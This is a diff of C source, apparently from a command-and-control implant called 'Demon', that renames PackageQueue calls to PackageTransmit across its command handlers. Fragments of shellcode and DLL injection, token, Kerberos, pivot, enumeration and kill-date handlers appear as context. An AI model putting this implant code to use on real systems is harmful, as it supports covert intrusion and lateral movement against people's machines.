@@ -174,7 +174,7 @@ VOID CommandCheckin( PPARSER Parser )
 
     DemonMetaData( &Package, FALSE );
 
-    PackageTransmit( Package, NULL, NULL );
+    PackageTransmit( Package );
 }
 
 VOID CommandSleep( PPARSER Parser )
@@ -188,7 +188,7 @@ VOID CommandSleep( PPARSER Parser )
 
     PackageAddInt32( Package, Instance.Config.Sleeping );
     PackageAddInt32( Package, Instance.Config.Jitter );
-    PackageQueue( Package );
+    PackageTransmit( Package );
 }
 
 VOID CommandJob( PPARSER Parser )
@@ -263,7 +263,7 @@ VOID CommandJob( PPARSER Parser )
         }
     }
 
-    PackageQueue( Package );
+    PackageTransmit( Package );
 }
 
 VOID CommandProc( PPARSER Parser )
@@ -556,7 +556,7 @@ VOID CommandProc( PPARSER Parser )
     }
 
     // TODO: handle error
-    PackageQueue( Package );
+    PackageTransmit( Package );
 }
 
 /*!
@@ -663,7 +663,7 @@ VOID CommandProcList(
             SysProcessInfo = C_PTR( U_PTR( SysProcessInfo ) + SysProcessInfo->NextEntryOffset );
         } while ( TRUE );
 
-        PackageQueue( Package );
+        PackageTransmit( Package );
 
         /* Free our process list */
         if ( SysProcessPtr ) {
@@ -712,7 +712,7 @@ VOID CommandFS( PPARSER Parser )
                 if ( ! ( Return = Instance.Win32.GetCurrentDirectoryW( MAX_PATH * 2, T ) ) )
                 {
                     PRINTF( "Failed to get current dir: %d\n", NtGetLastError() );
-                    PackageQueueError( CALLBACK_ERROR_WIN32, NtGetLastError() );
+                    PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                 }
                 else
                     PackageAddWString( Package, T );
@@ -727,7 +727,7 @@ VOID CommandFS( PPARSER Parser )
             hFile = Instance.Win32.FindFirstFileW( Path, &FindData );
             if ( hFile == INVALID_HANDLE_VALUE )
             {
-                PackageQueueError( CALLBACK_ERROR_WIN32, NtGetLastError() );
+                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                 Instance.Win32.FindClose( hFile );
 
                 PUTS( "LEAVE" )
@@ -927,7 +927,7 @@ VOID CommandFS( PPARSER Parser )
             LPWSTR Path     = ParserGetWString( Parser, &PathSize );
 
             if ( ! Instance.Win32.SetCurrentDirectoryW( Path ) ) {
-                PackageQueueError( CALLBACK_ERROR_WIN32, NtGetLastError() );
+                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                 goto LEAVE;
             } else {
                 PackageAddWString( Package, Path );
@@ -945,7 +945,7 @@ VOID CommandFS( PPARSER Parser )
             if ( dwAttrib != INVALID_FILE_ATTRIBUTES && ( dwAttrib & FILE_ATTRIBUTE_DIRECTORY ) )
             {
                 if ( ! Instance.Win32.RemoveDirectoryW( Path ) ) {
-                    PackageQueueError( CALLBACK_ERROR_WIN32, NtGetLastError() );
+                    PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                     goto LEAVE;
                 } else {
                     PackageAddInt32( Package, TRUE );
@@ -954,7 +954,7 @@ VOID CommandFS( PPARSER Parser )
             else
             {
                 if ( ! Instance.Win32.DeleteFileW( Path ) ) {
-                    PackageQueueError( CALLBACK_ERROR_WIN32, NtGetLastError() );
+                    PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                     goto LEAVE;
                 } else {
                     PackageAddInt32( Package, FALSE );
@@ -973,7 +973,7 @@ VOID CommandFS( PPARSER Parser )
 
             if ( ! Instance.Win32.CreateDirectoryW( Path, NULL ) )
             {
-                PackageQueueError( CALLBACK_ERROR_WIN32, NtGetLastError() );
+                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                 goto LEAVE;
             }
 
@@ -1014,7 +1014,7 @@ VOID CommandFS( PPARSER Parser )
 
             if ( ! ( Return = Instance.Win32.GetCurrentDirectoryW( MAX_PATH * 2, Path ) ) ) {
                 PRINTF( "Failed to get current dir: %d\n", NtGetLastError() );
-                PackageQueueError( CALLBACK_ERROR_WIN32, NtGetLastError() );
+                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
             } else {
                 PackageAddWString( Package, Path );
             }
@@ -1055,7 +1055,7 @@ VOID CommandFS( PPARSER Parser )
     }
 
     PUTS( "Transmit package" )
-    PackageQueue( Package );
+    PackageTransmit( Package );
 
 LEAVE:
     PUTS( "PackageDestroy" )
@@ -1163,13 +1163,13 @@ VOID CommandInjectDLL( PPARSER Parser )
     }
     else
     {
-        PackageQueueError( CALLBACK_ERROR_WIN32, NtGetLastError() );
+        PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
     }
 
     PRINTF( "Injected Result: %d\n", Result )
 
     PackageAddInt32( Package, Result );
-    PackageQueue( Package );
+    PackageTransmit( Package );
 }
 
 VOID CommandSpawnDLL( PPARSER Parser )
@@ -1188,7 +1188,7 @@ VOID CommandSpawnDLL( PPARSER Parser )
     Result  = DllSpawnReflective( DllLdr, DllLdrSize, DllBytes, DllSize, Arguments, ArgSize, &InjCtx );
 
     PackageAddInt32( Package, Result );
-    PackageQueue( Package );
+    PackageTransmit( Package );
 }
 
 VOID CommandInjectShellcode(
@@ -1295,7 +1295,7 @@ VOID CommandInjectShellcode(
 
 
     PackageAddInt32( Package, Status );
-    PackageQueue( Package );
+    PackageTransmit( Package );
 }
 
 VOID CommandToken( PPARSER Parser )
@@ -1323,7 +1323,7 @@ VOID CommandToken( PPARSER Parser )
             else
             {
                 PUTS( "Token not found in vault." )
-                PackageQueueError( CALLBACK_ERROR_TOKEN, 0x1 );
+                PackageTransmitError( CALLBACK_ERROR_TOKEN, 0x1 );
                 PackageAddInt32( Package, FALSE );
                 PackageAddInt32( Package, 0 );
             }
@@ -1629,7 +1629,7 @@ VOID CommandToken( PPARSER Parser )
         }
     }
 
-    PackageQueue( Package );
+    PackageTransmit( Package );
 }
 
 VOID CommandAssemblyInlineExecute( PPARSER Parser )
@@ -1703,7 +1703,7 @@ VOID CommandAssemblyInlineExecute( PPARSER Parser )
         {
             PPACKAGE Package = PackageCreate( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE );
             PackageAddInt32( Package, DOTNET_INFO_FAILED );
-            PackageQueue( Package );
+            PackageTransmit( Package );
 
             DotnetClose();
         }
@@ -1780,7 +1780,7 @@ VOID CommandAssemblyListVersion( PPARSER Parser )
         pRunTimeInfo = NULL;
     }
 
-    PackageQueue( Package );
+    PackageTransmit( Package );
 }
 
 VOID CommandConfig( PPARSER Parser )
@@ -1823,12 +1823,12 @@ VOID CommandConfig( PPARSER Parser )
                         Instance.Config.Implant.ThreadStartAddr = ThreadAddr + Offset;
                     }
                     else {
-                        PackageQueueError( CALLBACK_ERROR_WIN32, ERROR_INVALID_FUNCTION );
+                        PackageTransmitError( CALLBACK_ERROR_WIN32, ERROR_INVALID_FUNCTION );
                     }
 
                     PRINTF( "ThreadAddr => %x\n", ThreadAddr );
                 } else {
-                    PackageQueueError( CALLBACK_ERROR_WIN32, ERROR_MOD_NOT_FOUND );
+                    PackageTransmitError( CALLBACK_ERROR_WIN32, ERROR_MOD_NOT_FOUND );
                 }
             }
 
@@ -1916,12 +1916,12 @@ VOID CommandConfig( PPARSER Parser )
                     if ( ThreadAddr ) {
                         Instance.Config.Inject.SpoofAddr = ThreadAddr + Offset;
                     } else {
-                        PackageQueueError( CALLBACK_ERROR_WIN32, ERROR_INVALID_FUNCTION );
+                        PackageTransmitError( CALLBACK_ERROR_WIN32, ERROR_INVALID_FUNCTION );
                     }
 
                     PRINTF( "ThreadAddr => %x\n", ThreadAddr );
                 }
-                else PackageQueueError( CALLBACK_ERROR_WIN32, ERROR_MOD_NOT_FOUND );
+                else PackageTransmitError( CALLBACK_ERROR_WIN32, ERROR_MOD_NOT_FOUND );
             }
 
             PackageAddString( Package, Library );
@@ -1999,7 +1999,7 @@ VOID CommandConfig( PPARSER Parser )
             break;
     }
 
-    PackageQueue( Package );
+    PackageTransmit( Package );
 }
 
 VOID CommandScreenshot( PPARSER Parser )
@@ -2023,7 +2023,7 @@ VOID CommandScreenshot( PPARSER Parser )
         PackageAddInt32( Package, FALSE );
     }
 
-    PackageQueue( Package );
+    PackageTransmit( Package );
 }
 
 // TODO: The Net module is unstable so fix those issues to work on normal workstation and domain server
@@ -2050,7 +2050,7 @@ VOID CommandNet( PPARSER Parser )
                 {
                     if ( ! Instance.Win32.GetComputerNameExA( ComputerNameDnsDomain, Domain, &Length ) )
                     {
-                        PackageQueueError( CALLBACK_ERROR_WIN32, NtGetLastError() );
+                        PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                         PackageDestroy( Package );
                     }
                 }
@@ -2103,7 +2103,7 @@ VOID CommandNet( PPARSER Parser )
                     NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NetStatus ) );
 
                     PRINTF( "NetWkstaUserEnum: Failed [%d]\n", NtGetLastError() );
-                    PackageQueueError( CALLBACK_ERROR_WIN32, NtGetLastError() );
+                    PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                     goto CLEANUP;
                 }
 
@@ -2165,7 +2165,7 @@ VOID CommandNet( PPARSER Parser )
                 else
                 {
                     PRINTF( "NetSessionEnum: Failed [%d]\n", NtGetLastError() );
-                    PackageQueueError( CALLBACK_ERROR_WIN32, NtGetLastError() );
+                    PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                     goto SESSION_CLEANUP;
                 }
 
@@ -2312,7 +2312,7 @@ VOID CommandNet( PPARSER Parser )
             else
             {
                 PRINTF( "NetGroupEnum: Failed [%d : %d]\n", NtGetLastError(), NetStatus );
-                PackageQueueError( CALLBACK_ERROR_WIN32, NtGetLastError() );
+                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
             }
 
             if ( GroupInfo )
@@ -2360,7 +2360,7 @@ VOID CommandNet( PPARSER Parser )
             else
             {
                 PRINTF( "NetGroupEnum: Failed [%d : %d]\n", NtGetLastError(), NetStatus );
-                PackageQueueError( CALLBACK_ERROR_WIN32, NtGetLastError() );
+                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
             }
 
             break;
@@ -2373,7 +2373,7 @@ VOID CommandNet( PPARSER Parser )
         }
     }
 
-    PackageQueue( Package );
+    PackageTransmit( Package );
 }
 
 VOID CommandPivot( PPARSER Parser )
@@ -2518,7 +2518,7 @@ VOID CommandPivot( PPARSER Parser )
     }
 
     PUTS( "Pivot transport" )
-    PackageQueue( Package );
+    PackageTransmit( Package );
 }
 
 VOID CommandTransfer( PPARSER Parser )
@@ -2641,7 +2641,7 @@ VOID CommandTransfer( PPARSER Parser )
                 PackageAddInt32( Package2, Command );
                 PackageAddInt32( Package2, FileID );
                 PackageAddInt32( Package2, DOWNLOAD_REASON_REMOVED );
-                PackageQueue( Package2 );
+                PackageTransmit( Package2 );
                 Package2 = NULL;
             }
 
@@ -2649,7 +2649,7 @@ VOID CommandTransfer( PPARSER Parser )
         }
     }
 
-    PackageQueue( Package );
+    PackageTransmit( Package );
 }
 
 VOID CommandSocket( PPARSER Parser )
@@ -2978,7 +2978,7 @@ VOID CommandSocket( PPARSER Parser )
         default: break;
     }
 
-    PackageQueue( Package );
+    PackageTransmit( Package );
 }
 
 VOID CommandKerberos(
@@ -3138,7 +3138,7 @@ VOID CommandKerberos(
         default: break;
     }
 
-    PackageQueue( Package );
+    PackageTransmit( Package );
 }
 
 VOID CommandMemFile( PPARSER Parser )
@@ -3164,7 +3164,7 @@ VOID CommandMemFile( PPARSER Parser )
     PackageAddInt32( Package, ID );
     PackageAddInt32( Package, MemFile != NULL ? TRUE : FALSE );
 
-    PackageQueue( Package );
+    PackageTransmit( Package );
 }
 
 BOOL InWorkingHours( )
@@ -3212,7 +3212,7 @@ VOID KillDate( )
      * "They say time is the fire in which we burn.
      * Right now, Captain, my time is running out." */
     PPACKAGE Package = PackageCreate( DEMON_KILL_DATE );
-    PackageQueue( Package );
+    PackageTransmit( Package );
     PackageTransmitAll( NULL, NULL );
 
     CommandExit( NULL );
@@ -3249,7 +3249,7 @@ VOID CommandExit( PPARSER Parser )
         ExitMethod = ParserGetInt32( Parser );
 
         PackageAddInt32( Package, ExitMethod );
-        PackageQueue( Package );
+        PackageTransmit( Package );
         PackageTransmitAll( NULL, NULL );
     }
 
